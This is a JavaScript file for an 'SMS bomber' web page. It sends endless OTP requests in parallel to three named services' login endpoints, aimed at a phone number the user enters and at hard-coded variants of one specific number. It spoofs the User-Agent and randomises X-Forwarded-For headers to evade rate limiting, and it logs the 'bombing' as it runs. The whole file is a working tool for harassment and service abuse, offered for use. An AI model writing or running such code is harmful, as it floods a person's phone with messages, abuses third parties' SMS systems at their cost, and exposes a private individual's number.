// ===== CONFIG =====
const REQUESTS = [
    {
        name: "Pansho OTP Login",
        url: "https://pansho.com/customer/auth/login",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        body: (phone) => `_token=DUMMY_TOKEN&login_type=otp-login&phone=${phone}&country_code=91`,
        phones: ["9729480795", "+919729480795", "919729480795"]
    },
    {
        name: "Apitxt OTP",
        url: "https://apitxt.com/api/auth/login/request-otp",
        method: "POST",
        headers: {"Accept": "application/json", "Content-Type": "application/json"},
        body: (phone) => JSON.stringify({country_code: "91", mobile_no: phone.replace('+91','').replace('91',''), channel: "sms"}),
        phones: ["9729480795", "919729480795", "09729480795"]
    },
    {
        name: "Testbook OTP",
        url: "https://api.testbook.com/api/v2/otp/send?emailOrMobile={phone}&resend=true",
        method: "POST",
        headers: {"Accept": "application/json", "Content-Type": "application/json", "X-Tb-Client": "web,1.3"},
        body: (phone) => JSON.stringify({}),
        phones: ["9729480795", "+919729480795", "919729480795"]
    }
];

// ===== STATE =====
let running = false;
let stats = { total: 0, success: 0, failed: 0 };
let threads = [];
let stopFlag = false;

// ===== DOM =====
const logBox = document.getElementById('logBox');
const totalCount = document.getElementById('totalCount');
const successCount = document.getElementById('successCount');
const failedCount = document.getElementById('failedCount');
const statusDot = document.getElementById('statusDot');
const statusText = document.getElementById('statusText');
const startBtn = document.getElementById('startBtn');
const stopBtn = document.getElementById('stopBtn');
const targetPhone = document.getElementById('targetPhone');

function addLog(msg) {
    const entry = document.createElement('div');
    entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
    logBox.prepend(entry);
    if (logBox.children.length > 50) logBox.removeChild(logBox.lastChild);
}

function updateStats() {
    totalCount.textContent = stats.total;
    successCount.textContent = stats.success;
    failedCount.textContent = stats.failed;
}

function updateStatus(runningState) {
    if (runningState) {
        statusDot.className = 'status-dot running';
        statusText.textContent = 'Running';
        statusText.style.color = '#00cc44';
        startBtn.style.display = 'none';
        stopBtn.style.display = 'block';
    } else {
        statusDot.className = 'status-dot stopped';
        statusText.textContent = 'Stopped';
        statusText.style.color = '#888';
        startBtn.style.display = 'block';
        stopBtn.style.display = 'none';
    }
}

// ===== SEND REQUEST =====
async function sendRequest(req, phone) {
    try {
        const url = req.url.replace(/\{phone\}/g, phone);
        const headers = { ...req.headers };
        headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
        headers['X-Forwarded-For'] = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
        
        let body = req.body(phone);
        
        const resp = await fetch(url, {
            method: req.method,
            headers: headers,
            body: body
        });
        
        return resp.status;
    } catch {
        return 0;
    }
}

// ===== BOMBING WORKER =====
async function worker(req, phone) {
    while (!stopFlag) {
        const phoneVariants = req.phones || [phone];
        const targetPhone = phoneVariants[Math.floor(Math.random() * phoneVariants.length)];
        const status = await sendRequest(req, targetPhone);
        
        stats.total++;
        if (status === 200 || status === 302 || status === 201 || status === 202) {
            stats.success++;
            addLog(`✅ ${req.name} | ${targetPhone} | ${status}`);
        } else {
            stats.failed++;
            addLog(`❌ ${req.name} | ${targetPhone} | ${status}`);
        }
        updateStats();
    }
}

// ===== START =====
async function startBomb() {
    const phone = targetPhone.value.trim();
    if (!phone) {
        alert('Enter phone number!');
        return;
    }
    
    if (running) return;
    
    // Reset
    stopFlag = false;
    stats = { total: 0, success: 0, failed: 0 };
    updateStats();
    updateStatus(true);
    addLog(`🚀 Bombing started on ${phone}`);
    
    running = true;
    threads = [];
    
    // Start one thread per request type
    for (const req of REQUESTS) {
        const t = new Promise((resolve) => {
            worker(req, phone).then(resolve);
        });
        threads.push(t);
    }
    
    await Promise.all(threads);
    
    if (!stopFlag) {
        running = false;
        updateStatus(false);
        addLog(`⏹️ Bombing stopped automatically`);
    }
}

// ===== STOP =====
function stopBomb() {
    stopFlag = true;
    running = false;
    updateStatus(false);
    addLog(`⏹️ Stopped by user`);
}
